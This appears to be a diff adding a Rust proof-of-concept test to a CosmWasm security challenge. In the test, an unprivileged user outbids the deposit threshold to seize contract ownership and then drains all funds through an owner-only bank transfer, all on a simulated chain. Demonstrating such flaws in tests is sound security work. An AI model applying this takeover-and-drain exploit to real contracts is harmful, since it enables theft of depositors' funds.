@@ -2,9 +2,9 @@
 pub mod tests {
     use crate::{
         contract::DENOM,
-        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
+        msg::{ConfigQueryResponse, ExecuteMsg, InstantiateMsg, QueryMsg},
     };
-    use cosmwasm_std::{coin, Addr, Empty, Uint128};
+    use cosmwasm_std::{coin, Addr, Empty, Uint128, BankMsg, CosmosMsg};
     use cw_multi_test::{App, Contract, ContractWrapper, Executor};
 
     pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
@@ -140,5 +140,59 @@ pub mod tests {
 
         let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
         assert_eq!(bal.amount, Uint128::new(100));
+    }
+
+    const UNPRIVILEGED_USER: &str = "unprivileged_user";
+
+    #[test]
+    fn exploit_top_depositor_key_collision() {
+        let (mut app, addr) = base_scenario();
+
+        let top: Addr = app
+            .wrap()
+            .query_wasm_smart(addr.clone(), &QueryMsg::Top {})
+            .unwrap();
+        assert_eq!(top, Addr::unchecked(USER2));
+
+        // Note that user 2 is already the ADMIN from the base scenario
+        let config: ConfigQueryResponse = app
+            .wrap()
+            .query_wasm_smart(addr.clone(), &QueryMsg::Config {})
+            .unwrap();
+        assert_eq!(config.owner, Addr::unchecked(USER2));
+        assert_eq!(config.threshold, Uint128::from(110u128));
+
+        // But another unprivileged user can still become the owner by becoming top depositor
+        app = mint_tokens(app, UNPRIVILEGED_USER.to_string(), Uint128::from(111u128));
+        app.execute_contract(
+            Addr::unchecked(UNPRIVILEGED_USER),
+            addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(111u128, DENOM)],
+        )
+        .unwrap();
+        let config: ConfigQueryResponse = app
+            .wrap()
+            .query_wasm_smart(addr.clone(), &QueryMsg::Config {})
+            .unwrap();
+        assert_eq!(config.owner, Addr::unchecked(UNPRIVILEGED_USER));
+        assert_eq!(config.threshold, Uint128::from(111u128));
+
+        // And drain all the funds through `OwnerAction {}` :(
+        app.execute_contract(
+            Addr::unchecked(UNPRIVILEGED_USER),
+            addr.clone(),
+            &ExecuteMsg::OwnerAction {
+                msg: CosmosMsg::Bank(BankMsg::Send {
+                    to_address: UNPRIVILEGED_USER.to_string(),
+                    amount: vec![coin(110 + 100 + 111, DENOM)],
+                })
+            },
+            &[],
+        ).unwrap();
+
+        // Now the contract is empty
+        let bal = app.wrap().query_balance(addr, DENOM).unwrap();
+        assert_eq!(bal.amount, Uint128::zero());        
     }
 }
